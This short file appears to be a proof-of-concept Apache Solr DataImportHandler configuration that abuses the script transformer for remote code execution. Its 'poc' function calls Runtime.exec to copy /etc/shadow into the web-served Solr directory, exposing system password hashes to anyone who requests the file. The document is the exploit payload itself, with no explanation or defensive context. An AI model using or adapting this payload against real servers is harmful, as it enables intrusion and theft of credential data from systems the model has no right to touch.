
<dataConfig>
    <dataSource type="URLDataSource"/>
    <script><![CDATA[
        function poc(){ java.lang.Runtime.getRuntime().exec("cp /etc/shadow /opt/solr/server/solr-webapp/webapp/poc.txt");
}
]]></script>
<document>
    <entity name="stackoverflow"
        url="http://X/solr"
        processor="XPathEntityProcessor"
        forEach="/note"
        transformer="script:poc" />
</document>
</dataConfig>


